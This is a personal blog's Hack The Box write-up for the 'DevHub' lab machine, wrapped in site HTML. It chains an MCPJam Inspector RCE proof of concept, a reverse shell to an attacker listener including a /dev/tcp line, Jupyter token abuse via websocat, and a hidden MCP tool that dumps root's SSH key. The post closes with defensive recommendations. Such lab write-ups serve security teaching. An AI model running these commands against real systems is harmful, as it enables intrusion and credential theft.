@@ -1,0 +1,347 @@
+<!DOCTYPE html> <html lang="en, fr"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> HTB DevHub Write-up (Season 11) | My personal Blog </title> <meta name="author" content="Tchamiye Lidao TCHENDIE"> <meta name="description" content="RCE on MCPJam Inspector, lateral movement via Jupyter/websocat, and root privilege escalation through a hidden endpoint on an internal MCP server."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; font-src 'self' data: https:; media-src 'self' https:; frame-src 'self' https:; connect-src 'self' https:;"> <style>
+  :root {
+    --max-content-width: 930px;
+  }
+</style> <link rel="stylesheet" href="/assets/css/tailwind.css?v=50c64c15cbb9fd1ce6056fdb8bcb4b62"> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css" integrity="sha256-MVopmdyC2tYTiJ8wlktf0uh0v4NgT+vNdyVFepi7Q0c=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.5/css/academicons.min.css" integrity="sha256-SzrCOBJbGVFMahewkgjwnApaV2+av1DwMAA+/QGLyZw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://cdn.jsdelivr.net/npm/scholar-icons@1.0.3/css/scholar-icons.css" integrity="sha256-VY3hHVj/hNX3fYG6wtbA6TcKJQl7+FthzGSyIB64klY=" crossorigin="anonymous"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?v=591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%BE&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?v=3116ba77db9ee1581d05bb3e86fbf7f1"> <link rel="canonical" href="https://pucci-07.github.io/blog/2026/htb-devhub-writeup-en/"> <script src="/assets/js/theme.js?v=5286c3e4c334d0ecb8fc0c40ff4fa7ec"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?v=5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> My personal Blog </a> <button class="navbar-toggler collapsed navbar-toggler-main" type="button" data-nav-toggle="navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse navbar-collapse-main" id="navbarNav"> <ul class="navbar-nav navbar-menu-list flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">CV </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-nav-dropdown-toggle="true" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/books/">bookshelf</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="nav-item"> <button id="search-toggle" type="button" title="Search" aria-label="Open search"> <span class="nav-link">ctrl k <i class="fa-solid fa-magnifying-glass"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" type="button" title="Change theme" aria-label="Change color theme"> <i class="fa-half-sun-moon" id="light-toggle-system"></i> <i class="fa-solid fa-moon" id="light-toggle-dark"></i> <i class="fa-solid fa-sun" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">HTB DevHub Write-up (Season 11)</h1> <p class="post-meta"> Created on August 02, 2026 </p> <p class="post-tags"> <a href="/blog/2026"> <i class="fa-solid fa-calendar fa-sm"></i> 2026 </a>   ·   <a href="/blog/tag/htb"> <i class="fa-solid fa-hashtag fa-sm"></i> htb</a>   <a href="/blog/tag/writeup"> <i class="fa-solid fa-hashtag fa-sm"></i> writeup</a>   <a href="/blog/tag/linux"> <i class="fa-solid fa-hashtag fa-sm"></i> linux</a>   <a href="/blog/tag/mcp"> <i class="fa-solid fa-hashtag fa-sm"></i> mcp</a>   <a href="/blog/tag/rce"> <i class="fa-solid fa-hashtag fa-sm"></i> rce</a>   <a href="/blog/tag/privesc"> <i class="fa-solid fa-hashtag fa-sm"></i> privesc</a>   ·   <a href="/blog/category/write-ups"> <i class="fa-solid fa-tag fa-sm"></i> Write-ups</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <p><strong>Machine</strong>: DevHub (HTB Season 11) — Medium, Linux <strong>Author</strong>: DoOm / ppporrkkky <strong>HTB profile</strong>: <a href="https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de" rel="external nofollow noopener" target="_blank">https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de</a></p> <h2 id="reconnaissance">Reconnaissance</h2> <p>Once the target IP is obtained, recon starts with <code class="language-plaintext highlighter-rouge">nmap</code>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.129.245.216 -T5 -sCV -p-
+</code></pre></div></div> <p>The scan reveals three open ports:</p> <ul> <li> <strong>22/tcp</strong> — OpenSSH 8.9p1 (Ubuntu)</li> <li> <strong>80/tcp</strong> — nginx 1.18.0, redirecting to <code class="language-plaintext highlighter-rouge">http://devhub.htb/</code> </li> <li> <strong>6274/tcp</strong> — unrecognized by nmap, but the response fingerprint identifies a <strong>MCPJam Inspector</strong> instance</li> </ul> <p>Visiting the site on port 80 reveals an internal landing page titled <strong>DevHub — Internal Development &amp; Analytics Platform</strong>, referencing three services:</p> <ul> <li> <strong>MCP Inspector</strong> — active on port 6274</li> <li> <strong>Analytics Dashboard</strong> — a Jupyter environment, restricted to <code class="language-plaintext highlighter-rouge">localhost:8888</code> </li> <li> <strong>Code Repository</strong> — an internal Git server, in maintenance mode</li> </ul> <p>The Jupyter service on localhost:8888 is noted as a potential attack surface, but isn’t the immediate priority.</p> <h2 id="initial-exploitation--rce-on-mcpjam-inspector">Initial exploitation — RCE on MCPJam Inspector</h2> <p>Port 6274 exposes an MCP server reachable from the internet. The <strong>Settings</strong> page of the interface reveals the exact software version:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MCPJam Version: v1.4.2
+</code></pre></div></div> <p>A search on GitHub Security Advisories confirms this version is vulnerable:</p> <blockquote> <p><strong>GHSA-232v-j27c-5pp6</strong> — REC in MCPJam inspector due to HTTP Endpoint exposes (Critical severity) Package <code class="language-plaintext highlighter-rouge">@mcpjam/inspector</code> (npm) — affected versions: <code class="language-plaintext highlighter-rouge">&lt;= 1.4.2</code>, patched in <code class="language-plaintext highlighter-rouge">1.4.3</code></p> </blockquote> <p>The official GitHub Advisory PoC allows RCE through a simple HTTP request:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;target&gt;:6274/api/mcp/connect <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="se">\</span>
+  <span class="s2">"{</span><span class="se">\"</span><span class="s2">serverConfig</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">command</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">cmd.exe</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">args</span><span class="se">\"</span><span class="s2">:[</span><span class="se">\"</span><span class="s2">/c</span><span class="se">\"</span><span class="s2">, </span><span class="se">\"</span><span class="s2">calc</span><span class="se">\"</span><span class="s2">],</span><span class="se">\"</span><span class="s2">env</span><span class="se">\"</span><span class="s2">:{}},</span><span class="se">\"</span><span class="s2">serverId</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">mytest</span><span class="se">\"</span><span class="s2">}"</span>
+</code></pre></div></div> <p>In this case, the target is very likely a Linux machine, so the PoC is adapted using a Python variant available on Exploit-DB (<a href="https://www.exploit-db.com/exploits/52625" rel="external nofollow noopener" target="_blank">exploit 52625</a>) to get a reverse shell instead.</p> <p>After starting a listener:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div> <p>… the exploit is launched with matching parameters (attacker IP and port). A shell is obtained:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
+</code></pre></div></div> <h3 id="shell-stabilization">Shell stabilization</h3> <p>To upgrade this basic reverse shell into a fully interactive one:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div> <p>Once the PTY spawns, <code class="language-plaintext highlighter-rouge">Ctrl+Z</code> backgrounds it on the attacker side, then:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+</code></pre></div></div> <p>After <code class="language-plaintext highlighter-rouge">fg</code>, press Enter twice, then on the remote shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div> <p>This enables coloring, <code class="language-plaintext highlighter-rouge">clear</code>, and interactive programs like <code class="language-plaintext highlighter-rouge">vim</code> or <code class="language-plaintext highlighter-rouge">less</code>. (A simpler alternative, if <code class="language-plaintext highlighter-rouge">rlwrap</code> is installed on the attacker side, is starting the listener directly with <code class="language-plaintext highlighter-rouge">rlwrap nc -lvnp 4444</code>, which gives command history and line editing without the Python upgrade.)</p> <h2 id="system-enumeration-and-lateral-movement">System enumeration and lateral movement</h2> <p>Once the shell is stable, <code class="language-plaintext highlighter-rouge">linpeas.sh</code> is run to enumerate the system. Two things stand out in the process list:</p> <ol> <li> <strong>A Jupyter server started by user <code class="language-plaintext highlighter-rouge">analyst</code></strong>, bound to localhost, with a <strong>hardcoded token</strong> visible in the command line:</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/analyst/jupyter-env/bin/python3 -m jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser \
+  --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
+</code></pre></div></div> <ol> <li> <strong>A cron job run by <code class="language-plaintext highlighter-rouge">root</code></strong> executing a Python script:</li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+</code></pre></div></div> <p>The hardcoded Jupyter token enables lateral movement to the <code class="language-plaintext highlighter-rouge">analyst</code> user. Interacting with the Jupyter API allows creating a remote terminal session:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="s1">'http://127.0.0.1:8888/api/terminals'</span> <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s1">'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'</span> <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s1">'{"cwd":""}'</span> <span class="se">\</span>
+  <span class="nt">-i</span>
+</code></pre></div></div> <p>Response: <code class="language-plaintext highlighter-rouge">{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}</code> — a terminal ID (<code class="language-plaintext highlighter-rouge">1</code>) is returned.</p> <p>Commands are then sent over websocket using <a href="https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl" rel="external nofollow noopener" target="_blank">websocat</a>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'["stdin", "ls -la\r"]'</span> | ./websocat.x86_64-unknown-linux-musl <span class="se">\</span>
+  <span class="s2">"ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"</span>
+</code></pre></div></div> <p>This gives an interactive session as <code class="language-plaintext highlighter-rouge">analyst</code>. For a more comfortable working environment, a reverse shell is triggered toward a second listener:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9000
+</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'["stdin", "bash -i &gt;&amp; /dev/tcp/&lt;attacker_IP&gt;/9000 0&gt;&amp;1\r"]'</span> | ./websocat.x86_64-unknown-linux-musl <span class="se">\</span>
+  <span class="s2">"ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"</span>
+</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">analyst</code> shell is obtained and stabilized the same way as before. The user flag is found in <code class="language-plaintext highlighter-rouge">~/user.txt</code>.</p> <h2 id="privilege-escalation--hidden-endpoint-on-the-opsmcp-server">Privilege escalation — hidden endpoint on the OpsMCP server</h2> <p>Listing <code class="language-plaintext highlighter-rouge">analyst</code>’s home directory reveals an interesting file: <code class="language-plaintext highlighter-rouge">.opsmcp_key</code>.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>analyst@devhub:~$ cat .opsmcp_key
+opsmcp_secret_key_4f5a6b7c8d9e0f1a
+</code></pre></div></div> <p>The file name matches the earlier root cron job (<code class="language-plaintext highlighter-rouge">/opt/opsmcp/server.py</code>). Inspecting <code class="language-plaintext highlighter-rouge">/opt/opsmcp/</code> shows <code class="language-plaintext highlighter-rouge">server.py</code> is owned by <code class="language-plaintext highlighter-rouge">analyst</code> (read-only):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>analyst@devhub:~$ ls -la /opt/opsmcp/
+-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
+</code></pre></div></div> <p><strong>OpsMCP</strong> is an MCP (Model Context Protocol) server geared toward system operations: it exposes system administration tools (command execution, file access, process management, logs, services) to an LLM through the MCP protocol. Since it runs as <strong>root</strong>, any exploitable tool in this server executes with root privileges.</p> <p>Reading <code class="language-plaintext highlighter-rouge">server.py</code>, the hardcoded API key matches <code class="language-plaintext highlighter-rouge">.opsmcp_key</code> exactly:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VALID_API_KEY</span> <span class="o">=</span> <span class="sh">"</span><span class="s">opsmcp_secret_key_4f5a6b7c8d9e0f1a</span><span class="sh">"</span>
+</code></pre></div></div> <p>The server listens locally on port 5000:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+</code></pre></div></div> <p>Listing available tools via the API:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 127.0.0.1:5000/tools/list <span class="nt">-H</span> <span class="s2">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span>
+</code></pre></div></div> <p>… only returns 4 “public” tools (<code class="language-plaintext highlighter-rouge">ops.system_status</code>, <code class="language-plaintext highlighter-rouge">ops.list_services</code>, <code class="language-plaintext highlighter-rouge">ops.check_disk</code>, <code class="language-plaintext highlighter-rouge">ops.view_logs</code>). However, reading the full <code class="language-plaintext highlighter-rouge">server.py</code> source reveals an unlisted tool: <strong><code class="language-plaintext highlighter-rouge">ops._admin_dump</code></strong>, which dumps sensitive credentials (root SSH private key, or password hashes), gated behind a <code class="language-plaintext highlighter-rouge">confirm=true</code> parameter.</p> <p>Triggering this hidden endpoint to retrieve root’s SSH private key:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://127.0.0.1:5000/tools/call <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span> <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s1">'{
+    "name": "ops._admin_dump",
+    "arguments": {
+      "target": "ssh_keys",
+      "confirm": true
+    }
+  }'</span>
+</code></pre></div></div> <p>The response contains root’s private key, with escaped newlines (<code class="language-plaintext highlighter-rouge">\n</code>). A small Python script cleans it up before use:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">sys</span>
+
+<span class="k">def</span> <span class="nf">sanitize_key</span><span class="p">(</span><span class="n">input_path</span><span class="o">=</span><span class="sh">"</span><span class="s">enigma_root_key</span><span class="sh">"</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Processing file: </span><span class="si">{</span><span class="n">input_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">dos2unix</span><span class="sh">"</span><span class="p">,</span> <span class="n">input_path</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] dos2unix conversion successful.</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">except </span><span class="p">(</span><span class="nb">FileNotFoundError</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">):</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] </span><span class="sh">'</span><span class="s">dos2unix</span><span class="sh">'</span><span class="s"> not available, cleaning manually...</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">ignore</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="s">n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="sh">"</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">chmod</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="mo">0o400</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Key cleaned and permissions (400) applied to </span><span class="sh">'</span><span class="si">{</span><span class="n">input_path</span><span class="si">}</span><span class="sh">'</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Critical error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="n">target_file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="sh">"</span><span class="s">enigma_root_key</span><span class="sh">"</span>
+    <span class="nf">sanitize_key</span><span class="p">(</span><span class="n">target_file</span><span class="p">)</span>
+</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 sanitize_key.py enigma_root_key
+<span class="nb">chmod </span>400 enigma_root_key
+ssh <span class="nt">-i</span> enigma_root_key root@10.129.245.216
+</code></pre></div></div> <p>Root access is obtained. The root flag is found in <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p> <h2 id="recommendations">Recommendations</h2> <ul> <li>Regularly patch exposed applications and frameworks (MCPJam Inspector in particular).</li> <li>Never hardcode tokens or API keys in scripts or in process command lines visible to other local users.</li> <li>Avoid implementing critical, destructive functionality (like dumping the root SSH key) behind an API, even a “hidden” one — security through obscurity is not real protection.</li> <li>Restrict permissions on root-owned cron jobs that interact with components writable by lower-privileged accounts.</li> </ul> </div> </article> <div id="giscus_thread" style="max-width: 930px; margin: 0 auto;"> <br> <blockquote class="block-danger"> <h5>giscus comments misconfigured</h5> <p>Please follow instructions at <a href="http://giscus.app" rel="external nofollow noopener" target="_blank">http://giscus.app</a> and update your giscus configuration.</p> <p>Missing required keys: <code>repo_id, category_id</code>.</p> </blockquote> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2026 Tchamiye Lidao TCHENDIE. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script>
+  window.alFolio = {
+    compatBootstrap: false
+  };
+</script> <script src="/assets/js/nav-toggle.js?v=141bd79a73ebc0f0b6ea58e440ae79fc"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?v=e49affc7bd2646f6acdad1dbe02c2359" type="text/javascript"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/al_math/js/mathjax-setup.js"></script> <script src="/assets/js/tooltips-setup.js?v=fe487e99db6c43751e6e7bdb2d6a0611"></script> <script src="/assets/js/no_defer.js?v=53b1b1a645525975c963ce8bf8bfefcf"></script> <script defer src="/assets/js/common.js?v=87baac90f765f2f3362dcf6aaf312a8a"></script> <script defer src="/assets/js/copy_code.js?v=c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?v=896d254890d9b47f0281f63bfccf0dee"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/al_img_tools/js/zoom.js"></script> <script defer src="/assets/js/progress-bar.js?v=499464c5c63ced6cf7ad62509f1e2610" type="text/javascript"></script> <script src="https://cdn.jsdelivr.net/npm/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js" integrity="sha256-uMJJ3EoTyfRBoTbR+lrfu1uRQ87RZG8AR3cVNuQVeFg=" crossorigin="anonymous"></script> <script>
+    addBackToTop();
+  </script> <script type="module" src="/assets/al_search/js/search/ninja-keys.min.js"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/al_search/js/search-setup.js"></script> <script>
+// get the ninja-keys element
+const ninja = document.querySelector('ninja-keys');
+
+// add the home and posts menu items
+ninja.data = [{
+    id: "nav-about",
+    title: "about",
+    section: "Navigation",
+    handler: () => {
+      window.location.href = "/";
+    },
+  },{id: "nav-blog",
+          title: "blog",
+          description: "",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/blog/";
+          },
+        },{id: "nav-publications",
+          title: "publications",
+          description: "publications by categories in reversed chronological order. generated by jekyll-scholar.",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/publications/";
+          },
+        },{id: "nav-projects",
+          title: "projects",
+          description: "A growing collection of your cool projects.",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/projects/";
+          },
+        },{id: "nav-repositories",
+          title: "repositories",
+          description: "Edit the `_data/repositories.yml` and change the `github_users` and `github_repos` lists to include your own GitHub profile and repositories.",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/repositories/";
+          },
+        },{id: "nav-cv",
+          title: "CV",
+          description: "This is a description of the page. You can modify it in '_pages/cv.md'. You can also change or remove the top pdf download button.",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/cv/";
+          },
+        },{id: "nav-teaching",
+          title: "teaching",
+          description: "Course materials, schedules, and resources for classes taught.",
+          section: "Navigation",
+          handler: () => {
+            window.location.href = "/teaching/";
+          },
+        },{id: "nav-people",
+          title: "people",
+          description: "members of the lab or group",
+          section: "Navigation",
+          handler: () => {
